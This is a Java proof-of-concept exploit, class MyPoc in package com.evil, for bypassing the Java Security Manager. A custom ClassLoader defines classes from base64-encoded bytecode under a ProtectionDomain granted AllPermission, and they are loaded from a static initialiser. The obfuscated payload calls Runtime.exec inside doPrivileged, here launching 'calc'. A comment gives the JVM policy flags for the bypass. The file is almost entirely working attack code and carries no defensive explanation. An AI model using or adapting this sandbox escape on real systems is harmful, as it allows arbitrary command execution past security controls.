package com.evil;

import java.security.*;
import java.security.cert.Certificate;

public class MyPoc {
    //-Djava.security.manager -Djava.security.policy==bypass-by-createclassloader.policy
    static {
        try {
            Exp();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void Exp() throws Exception{
        BypassClassLoader0 bypassClassLoader = new BypassClassLoader0();
        Class aClass0 = bypassClassLoader.get(base64Decode("yv66vgAAADQAHwoABgAWBwAXCgACABYKABgAGQcAGgcAGwEADElubmVyQ2xhc3NlcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQALTGV2aWxDbGFzczsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAOZXZpbENsYXNzLmphdmEMAAgACQEAC2V2aWxDbGFzcyQxBwAcDAAdAB4BAAlldmlsQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAeamF2YS9zZWN1cml0eS9BY2Nlc3NDb250cm9sbGVyAQAMZG9Qcml2aWxlZ2VkAQA0KExqYXZhL3NlY3VyaXR5L1ByaXZpbGVnZWRBY3Rpb247KUxqYXZhL2xhbmcvT2JqZWN0OwAhAAUABgAAAAAAAwABAAgACQABAAoAAAAvAAEAAQAAAAUqtwABsQAAAAIACwAAAAYAAQAAAAQADAAAAAwAAQAAAAUADQAOAAAACQAPABAAAQAKAAAAKwAAAAEAAAABsQAAAAIACwAAAAYAAQAAABUADAAAAAwAAQAAAAEAEQASAAAACAATAAkAAQAKAAAAKAACAAAAAAAMuwACWbcAA7gABFexAAAAAQALAAAACgACAAAABgALABEAAgAUAAAAAgAVAAcAAAAKAAEAAgAAAAAACA=="), "evilClass");
        bypassClassLoader.get(base64Decode("yv66vgAAADQALQoACAAcCgAdAB4IAB8KAB0AIAcAIQoABQAiBwAjBwAkBwAlAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAxJbm5lckNsYXNzZXMBAA1MZXZpbENsYXNzJDE7AQADcnVuAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAR2YXIyAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAIQEAClNvdXJjZUZpbGUBAA5ldmlsQ2xhc3MuamF2YQEAD0VuY2xvc2luZ01ldGhvZAcAJgwACgALBwAnDAAoACkBAARjYWxjDAAqACsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAsAAsBAAtldmlsQ2xhc3MkMQEAEGphdmEvbGFuZy9PYmplY3QBAB5qYXZhL3NlY3VyaXR5L1ByaXZpbGVnZWRBY3Rpb24BAAlldmlsQ2xhc3MBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlADAABwAIAAEACQAAAAIAAAAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAGAA4AAAAMAAEAAAAFAA8AEQAAAAEAEgATAAEADAAAAGoAAgACAAAAErgAAhIDtgAEVwGwTCu2AAYBsAABAAAACgALAAUAAwANAAAAFgAFAAAACQAJAAoACwALAAwADAAQAA0ADgAAABYAAgAMAAYAFAAVAAEAAAASAA8AEQAAABYAAAAGAAFLBwAXAAMAGAAAAAIAGQAaAAAABAAbAAAAEAAAAAoAAQAHAAAAAAAI"), "evilClass$1");
        Class.forName(aClass0.getName(), true, bypassClassLoader);
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static class BypassClassLoader0 extends ClassLoader{
        public Class get(byte[] b,String name) {
            PermissionCollection pc = new Permissions();
            pc.add(new AllPermission());
            //设置ProtectionDomain
            ProtectionDomain pd = new ProtectionDomain(new CodeSource(null, (Certificate[]) null), pc, this, null);
            return super.defineClass(name, b, 0, b.length,pd);
        }
    }

    public static void main(String[] args) {

    }
}
